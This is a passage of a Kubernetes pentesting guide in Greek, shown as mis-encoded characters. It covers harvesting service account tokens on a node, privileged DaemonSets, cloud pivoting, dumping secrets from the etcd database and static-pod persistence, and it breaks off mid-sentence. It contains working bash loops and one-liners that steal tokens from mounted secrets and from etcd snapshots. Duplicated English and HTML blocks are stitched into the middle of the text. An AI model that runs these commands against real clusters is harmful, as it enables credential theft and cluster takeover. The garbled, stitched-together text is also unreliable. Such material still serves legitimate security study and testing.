### ÎšÎ»Î¿Ï€Î® ÎœÏ…ÏƒÏ„Î¹ÎºÏÎ½
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
Î¤Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) Î¸Î± Î±Î½Î±ÎºÏ„Î®ÏƒÎµÎ¹ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± **Ï„Î± Ï„Î¿ÎºÎµÎ½ Ï„Ï‰Î½ Î¬Î»Î»Ï‰Î½ pods ÎºÎ±Î¹ Î¸Î± ÎµÎ»Î­Î³Î¾ÎµÎ¹ Î±Î½ Î­Ï‡Î¿Ï…Î½ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î±** Ï€Î¿Ï… ÏˆÎ¬Ï‡Î½ÎµÏ„Îµ (Î±Î½Ï„Î¯ Î½Î± Ï„Î¿ ÎµÎ»Î­Î³Ï‡ÎµÏ„Îµ Î­Î½Î±-Î­Î½Î±):
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### Î ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡Î± DaemonSets

ÎˆÎ½Î± DaemonSet ÎµÎ¯Î½Î±Î¹ Î­Î½Î± **pod** Ï€Î¿Ï… Î¸Î± **Ï„ÏÎ­Ï‡ÎµÎ¹** ÏƒÎµ **ÏŒÎ»Î¿Ï…Ï‚ Ï„Î¿Ï…Ï‚ ÎºÏŒÎ¼Î²Î¿Ï…Ï‚ Ï„Î¿Ï… cluster**. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î±Î½ Î­Î½Î± DaemonSet ÏÏ…Î¸Î¼Î¹ÏƒÏ„ÎµÎ¯ Î¼Îµ Î­Î½Î± **Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡Î¿ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚**, ÏƒÎµ **ÎŸÎ›ÎŸÎ¥Î£ Ï„Î¿Ï…Ï‚ ÎºÏŒÎ¼Î²Î¿Ï…Ï‚** Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î¿ **Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÏŒ** ÎµÎºÎµÎ¯Î½Î¿Ï… Ï„Î¿Ï… **Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡Î¿Ï… Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï** Ï€Î¿Ï… Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ.

Î— ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· ÎµÎ¯Î½Î±Î¹ Î· Î¯Î´Î¹Î± Î¼Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Ï‚ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î·Ï‚ ÎµÎ½ÏŒÏ„Î·Ï„Î±Ï‚, Î±Î»Î»Î¬ Ï„ÏÏÎ± Î´ÎµÎ½ ÎµÎ¾Î±ÏÏ„Î¬ÏƒÏ„Îµ Î±Ï€ÏŒ Ï„Î·Î½ Ï„ÏÏ‡Î·.

### Î•Î½Î±Î»Î»Î±Î³Î® ÏƒÏ„Î¿ Cloud

Î‘Î½ Ï„Î¿ cluster Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Î­Î½Î±Î½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î± cloud, ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î¿ **ÎšÏŒÎ¼Î²Î¿Ï‚ Î¸Î± Î­Ï‡ÎµÎ¹ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ® Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ Ï„Î­Î»ÎµÎ¹Î¿ Î¼ÎµÏ„Î±Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½** ÏƒÎµ ÏƒÏ‡Î­ÏƒÎ· Î¼Îµ Ï„Î¿ Pod. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÏ„Îµ Î½Î± **Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ Ï„Î­Î»ÎµÎ¹Î¿ Î¼ÎµÏ„Î±Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î±Ï€ÏŒ Ï„Î¿Î½ ÎºÏŒÎ¼Î²Î¿** (Î® Î±Ï€ÏŒ Î­Î½Î± pod Î¼Îµ hostNetwork ÏƒÎµ True):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### ÎšÎ»Î¿Ï€Î® Ï„Î¿Ï… etcd

Î‘Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ±Î¸Î¿ÏÎ¯ÏƒÎµÏ„Îµ Ï„Î¿ [**ÏŒÎ½Î¿Î¼Î±ÎšÏŒÎ¼Î²Î¿Ï…**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) Ï„Î¿Ï… ÎšÏŒÎ¼Î²Î¿Ï… Ï€Î¿Ï… Î¸Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Ï„Î¿ container, Î±Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Î­Î½Î± ÎºÎ­Î»Ï…Ï†Î¿Ï‚ Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î±Î½ ÎºÏŒÎ¼Î²Î¿ ÎµÎ»Î­Î³Ï‡Î¿Ï… ÎºÎ±Î¹ Î±Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î· **Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ etcd**:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-plane ÎºÏŒÎ¼Î²Î¿Î¹ Î­Ï‡Î¿Ï…Î½ Ï„Î¿Î½ **ÏÏŒÎ»Î¿ master** ÎºÎ±Î¹ ÏƒÎµ **ÏƒÏÎ½Î¿Î»Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹Î¶ÏŒÎ¼ÎµÎ½Î± ÏƒÏ„Î¿ cloud Î´ÎµÎ½ Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Ï„Î¯Ï€Î¿Ï„Î± ÏƒÎµ Î±Ï…Ï„Î¿ÏÏ‚**.

#### Î”Î¹Î±Î²Î¬ÏƒÏ„Îµ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ Î±Ï€ÏŒ Ï„Î¿ etcd

Î‘Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Ï„Î¿ pod ÏƒÎ±Ï‚ ÏƒÎµ Î­Î½Î±Î½ ÎºÏŒÎ¼Î²Î¿ ÎµÎ»Î­Î³Ï‡Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿Î½ ÎµÏ€Î¹Î»Î¿Î³Î­Î± `nodeName` ÏƒÏ„Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Ï€ÏÎ¿Î´Î¹Î±Î³ÏÎ±Ï†ÏÎ½ Ï„Î¿Ï… pod, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î­Ï‡ÎµÏ„Îµ ÎµÏÎºÎ¿Î»Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ `etcd`, Î· Î¿Ï€Î¿Î¯Î± Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ ÏŒÎ»Î· Ï„Î· Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· Ï„Î¿Ï… ÏƒÏÎ½Î¿Î»Î¿Ï…, ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î±Î½Î¿Î¼Î­Î½Ï‰Î½ ÏŒÎ»Ï‰Î½ Ï„Ï‰Î½ Î¼Ï…ÏƒÏ„Î¹ÎºÏÎ½.

Î Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î­Î½Î±Ï‚ Î³ÏÎ®Î³Î¿ÏÎ¿Ï‚ ÎºÎ±Î¹ Î²ÏÏÎ¼Î¹ÎºÎ¿Ï‚ Ï„ÏÏŒÏ€Î¿Ï‚ Î½Î± Î±Î½Î±ÎºÏ„Î®ÏƒÎµÏ„Îµ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ Î±Ï€ÏŒ Ï„Î¿ `etcd` Î±Î½ Ï„ÏÎ­Ï‡ÎµÎ¹ ÏƒÏ„Î¿Î½ ÎºÏŒÎ¼Î²Î¿ ÎµÎ»Î­Î³Ï‡Î¿Ï… ÏƒÏ„Î¿Î½ Î¿Ï€Î¿Î¯Î¿ Î²ÏÎ¯ÏƒÎºÎµÏƒÏ„Îµ. Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î¼Î¹Î± Ï€Î¹Î¿ ÎºÎ¿Î¼ÏˆÎ® Î»ÏÏƒÎ· Ï€Î¿Ï… Î¾ÎµÎºÎ¹Î½Î¬ Î­Î½Î± pod Î¼Îµ Ï„Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Ï€ÎµÎ»Î¬Ï„Î· `etcd` `etcdctl` ÎºÎ±Î¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Ï„Î¿Ï… ÎºÏŒÎ¼Î²Î¿Ï… ÎµÎ»Î­Î³Ï‡Î¿Ï… Î³Î¹Î± Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯ ÏƒÏ„Î¿ etcd Î¿Ï€Î¿Ï…Î´Î®Ï€Î¿Ï„Îµ Ï„ÏÎ­Ï‡ÎµÎ¹, ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î¿ [Î±Ï…Ï„ÏŒ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î¼ÎµÏ„Î±Ï†Î¿ÏÎ¬Ï‚](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) Î±Ï€ÏŒ Ï„Î¿Î½ @mauilion.

**Î•Î»Î­Î³Î¾Ï„Îµ Î±Î½ Ï„Î¿ `etcd` Ï„ÏÎ­Ï‡ÎµÎ¹ ÏƒÏ„Î¿Î½ ÎºÏŒÎ¼Î²Î¿ ÎµÎ»Î­Î³Ï‡Î¿Ï… ÎºÎ±Î¹ Î´ÎµÎ¯Ï„Îµ Ï€Î¿Ï Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ (Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Î­Î½Î± ÏƒÏÎ½Î¿Î»Î¿ Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®Î¸Î·ÎºÎµ Î¼Îµ Ï„Î¿ `kubeadm`)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
```markdown
## Attacking Kubernetes from Inside a Pod

In a Kubernetes cluster, if an attacker gains access to a pod, they can perform various attacks to escalate privileges and move laterally within the cluster. Some common techniques include:

1. **Pod Escape**: Exploiting misconfigurations to break out of the pod and access the host machine.
2. **Service Account Token Theft**: Stealing service account tokens to impersonate the account and access cluster resources.
3. **Pod Network Sniffing**: Monitoring pod network traffic to intercept sensitive information.
4. **Pod to Node Lateral Movement**: Moving from one compromised pod to another within the same node.
5. **Pod to Pod Lateral Movement**: Moving laterally between pods on different nodes to expand control within the cluster.

To prevent these attacks, ensure proper RBAC policies, network segmentation, and pod security configurations are in place.
```
```html
<h2>Î•Ï€Î¯Î¸ÎµÏƒÎ· ÏƒÏ„Î¿ Kubernetes Î±Ï€ÏŒ Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± Pod</h2>

Î£Îµ Î­Î½Î± cluster Ï„Î¿Ï… Kubernetes, Î±Î½ Î­Î½Î±Ï‚ ÎµÎ¹ÏƒÎ²Î¿Î»Î­Î±Ï‚ ÎºÎµÏÎ´Î¯ÏƒÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î­Î½Î± pod, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î´Î¹Î¬Ï†Î¿ÏÎµÏ‚ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ Î³Î¹Î± Î½Î± ÎµÎ¾ÎµÎ»Î¯Î¾ÎµÎ¹ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÎºÎ±Î¹ Î½Î± Î¼ÎµÏ„Î±ÎºÎ¹Î½Î·Î¸ÎµÎ¯ Ï€Î»Î±Î³Î¯Ï‰Ï‚ ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… cluster. ÎšÎ¬Ï€Î¿Î¹ÎµÏ‚ ÏƒÏ…Î½Î®Î¸ÎµÎ¹Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½:

1. **Î‘Ï€ÏŒÎ´ÏÎ±ÏƒÎ· Î±Ï€ÏŒ Ï„Î¿ Pod**: Î•ÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿Ï‚ Î»Î±Î½Î¸Î±ÏƒÎ¼Î­Î½ÎµÏ‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Î³Î¹Î± Î½Î± Î²Î³ÎµÎ¹ Î±Ï€ÏŒ Ï„Î¿ pod ÎºÎ±Î¹ Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿Î½ ÎºÎµÎ½Ï„ÏÎ¹ÎºÏŒ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î®.
2. **ÎšÎ»Î¿Ï€Î® Î”Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÎ¿Ï Î›Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Î¥Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚**: ÎšÎ»Î­Î²Î¿Î½Ï„Î±Ï‚ Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÎ¬ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÏ‰Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ ÎºÎ±Î¹ Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Ï€ÏŒÏÎ¿Ï…Ï‚ Ï„Î¿Ï… cluster.
3. **ÎšÎ±Ï„Î¬ÏƒÎºÎ¿Ï€Î¿Ï‚ Î”Î¹ÎºÏ„ÏÎ¿Ï… Ï„Î¿Ï… Pod**: Î Î±ÏÎ±ÎºÎ¿Î»Î¿Ï…Î¸ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ ÎºÎ¯Î½Î·ÏƒÎ· Î´Î¹ÎºÏ„ÏÎ¿Ï… Ï„Î¿Ï… pod Î³Î¹Î± Î½Î± Ï€Î±ÏÎµÎ¼Î²Î±Î¯Î½ÎµÎ¹ ÏƒÎµ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚.
4. **Î Î»Î±Î³Î¯Î± ÎšÎ¯Î½Î·ÏƒÎ· Î±Ï€ÏŒ Ï„Î¿ Pod ÏƒÏ„Î¿Î½ ÎšÏŒÎ¼Î²Î¿**: ÎœÎµÏ„Î±ÎºÎ¹Î½Î¿ÏÎ¼ÎµÎ½Î¿Ï‚ Î±Ï€ÏŒ Î­Î½Î± Ï…Ï€Î¿Î²Î±Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î¿ pod ÏƒÎµ Î­Î½Î± Î¬Î»Î»Î¿ ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… Î¯Î´Î¹Î¿Ï… ÎºÏŒÎ¼Î²Î¿Ï….
5. **Î Î»Î±Î³Î¯Î± ÎšÎ¯Î½Î·ÏƒÎ· Î±Ï€ÏŒ Ï„Î¿ Pod ÏƒÏ„Î¿ Pod**: ÎœÎµÏ„Î±ÎºÎ¹Î½Î¿ÏÎ¼ÎµÎ½Î¿Ï‚ Ï€Î»Î±Î³Î¯Ï‰Ï‚ Î¼ÎµÏ„Î±Î¾Ï pods ÏƒÎµ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ¿ÏÏ‚ ÎºÏŒÎ¼Î²Î¿Ï…Ï‚ Î³Î¹Î± Î½Î± ÎµÏ€ÎµÎºÏ„ÎµÎ¯Î½ÎµÎ¹ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿ ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… cluster.

Î“Î¹Î± Î½Î± Î±Ï€Î¿Ï„ÏÎ­ÏˆÎµÏ„Îµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚, Î²ÎµÎ²Î±Î¹Ï‰Î¸ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ ÎºÎ±Ï„Î¬Î»Î»Î·Î»ÎµÏ‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ­Ï‚ RBAC, Î´Î¹Î±Ï‡Ï‰ÏÎ¹ÏƒÎ¼ÏŒÏ‚ Î´Î¹ÎºÏ„ÏÎ¿Ï… ÎºÎ±Î¹ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Ï„Î¿Ï… pod.
```
```bash
data-dir=/var/lib/etcd
```
**Î ÏÎ¿Î²Î¿Î»Î® Ï„Ï‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÏƒÏ„Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ etcd:**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**Î•Î¾Î±Î³Î¬Î³ÎµÏ„Îµ Ï„Î± Ï„Î¿ÎºÎµÎ½Ï‚ Î±Ï€ÏŒ Ï„Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÎºÎ±Î¹ ÎµÎ¼Ï†Î±Î½Î¯ÏƒÏ„Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**ÎŠÎ´Î¹Î± ÎµÎ½Ï„Î¿Î»Î®, Î±Î»Î»Î¬ Î¼Îµ Î¼ÎµÏÎ¹ÎºÎ¬ greps Î³Î¹Î± Î½Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ Î¼ÏŒÎ½Î¿ Ï„Î¿ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿ Ï„Î¿ÎºÎµÎ½ ÏƒÏ„Î¿ namespace kube-system**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
```markdown
## Attacking Kubernetes from Inside a Pod

When an attacker gains access to a Kubernetes pod, they are already inside the cluster and can perform various attacks to escalate their privileges and move laterally within the cluster.

### Privilege Escalation

#### Exploiting Service Accounts

Service accounts in Kubernetes are used by pods to interact with the API server. If an attacker gains access to a pod with highly privileged service account credentials, they can abuse these credentials to escalate their privileges within the cluster.

### Moving Laterally

#### Accessing the Kubernetes API Server

Once inside a pod, an attacker can attempt to access the Kubernetes API server using tools like `kubectl` or by sending direct API requests. This can allow the attacker to gather information about the cluster, deploy malicious workloads, or even take control of the entire cluster.

#### Exploiting Misconfigurations

Attackers can also look for misconfigurations within the cluster that may allow them to move laterally. This could include weak RBAC policies, exposed dashboards, or insecure network policies that enable communication with other pods.

By understanding these attack techniques, security professionals can better defend their Kubernetes clusters and prevent unauthorized access from within a compromised pod.
```
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### ÎœÏŒÎ½Î¹Î¼Î· Î‘Î½Ï„Î¿Ï‡Î® Î£Ï„Î±Ï„Î¹ÎºÏÎ½/ÎšÎ±Î¸ÏÎµÏ†Ï„Î¹ÏƒÎ¼Î­Î½Ï‰Î½ Pods

_Î¤Î± Î£Ï„Î±Ï„Î¹ÎºÎ¬ Pods_ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ Î±Ï€ÏŒ Ï„Î¿Î½ Î´Î±Î¯Î¼Î¿Î½Î± kubelet ÏƒÎµ Î­Î½Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ ÎºÏŒÎ¼Î²Î¿, Ï‡Ï‰ÏÎ¯Ï‚ Ï„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® API Î½Î± Ï„Î± Ï€Î±ÏÎ±Ï„Î·ÏÎµÎ¯. Î‘Î½Ï„Î¯Î¸ÎµÏ„Î± Î±Ï€ÏŒ Ï„Î± Pods Ï€Î¿Ï… Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ ÎµÎ»Î­Î³Ï‡Î¿Ï… (Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î­Î½Î± Deployment); Î±Î½Ï„' Î±Ï…Ï„Î¿Ï, Ï„Î¿ **kubelet Ï€Î±ÏÎ±ÎºÎ¿Î»Î¿Ï…Î¸ÎµÎ¯ ÎºÎ¬Î¸Îµ ÏƒÏ„Î±Ï„Î¹ÎºÏŒ Pod** (ÎºÎ±Î¹ Ï„Î¿ ÎµÏ€Î±Î½ÎµÎºÎºÎ¹Î½ÎµÎ¯ Î±Î½ Î±Ï€Î¿Ï„ÏÏ‡ÎµÎ¹).

Î£Ï…Î½ÎµÏ€ÏÏ‚, Ï„Î± ÏƒÏ„Î±Ï„Î¹ÎºÎ¬ Pods ÎµÎ¯Î½Î±Î¹ Ï€Î¬Î½Ï„Î± **Î´ÎµÎ¼Î­Î½Î± Î¼Îµ Î­Î½Î± Kubelet** ÏƒÎµ Î­Î½Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ ÎºÏŒÎ¼Î²Î¿.

Î¤Î¿ **kubelet Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î±Î½ ÎºÎ±Î¸ÏÎ­Ï†Ï„Î· Pod ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® API Ï„Î¿Ï… Kubernetes** Î³Î¹Î± ÎºÎ¬Î¸Îµ ÏƒÏ„Î±Ï„Î¹ÎºÏŒ Pod. Î‘Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Ï„Î± Pods Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ ÏƒÎµ Î­Î½Î±Î½ ÎºÏŒÎ¼Î²Î¿ ÎµÎ¯Î½Î±Î¹ Î¿ÏÎ±Ï„Î¬ ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® API, Î±Î»Î»Î¬ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÎ»ÎµÎ³Ï‡Î¸Î¿ÏÎ½ Î±Ï€ÏŒ ÎµÎºÎµÎ¯. Î¤Î± Î¿Î½ÏŒÎ¼Î±Ï„Î± Ï„Ï‰Î½ Pods Î¸Î± Î­Ï‡Î¿Ï…Î½ Ï‰Ï‚ ÎºÎ±Ï„Î¬Î»Î·Î¾Î· Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… ÎºÏŒÎ¼Î²Î¿Ï… Î¼Îµ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿ Ï€Î±ÏÎ»Î±.

{% hint style="danger" %}
Î¤Î¿ **`spec` ÎµÎ½ÏŒÏ‚ ÏƒÏ„Î±Ï„Î¹ÎºÎ¿Ï Pod Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Î½Î±Ï†Î­ÏÎµÏ„Î±Î¹ ÏƒÎµ Î¬Î»Î»Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î± Ï„Î¿Ï… API** (Ï€.Ï‡., ServiceAccount, ConfigMap, Secret, ÎºÎ»Ï€.). ÎˆÏ„ÏƒÎ¹ **Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î±Ï…Ï„Î®Î½ Ï„Î· ÏƒÏ…Î¼Ï€ÎµÏÎ¹Ï†Î¿ÏÎ¬ Î³Î¹Î± Î½Î± Î¾ÎµÎºÎ¹Î½Î®ÏƒÎµÏ„Îµ Î­Î½Î± pod Î¼Îµ Î­Î½Î± Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ serviceAccount** ÏƒÏ„Î¿Î½ Ï„ÏÎ­Ï‡Î¿Î½Ï„Î± ÎºÏŒÎ¼Î²Î¿ Î³Î¹Î± Î½Î± Î´Î¹Î±ÎºÎ¹Î½Î´Ï…Î½ÎµÏÏƒÎµÏ„Îµ Ï„Î¿ cluster. Î©ÏƒÏ„ÏŒÏƒÎ¿, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î±Ï…Ï„ÏŒ Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ pods 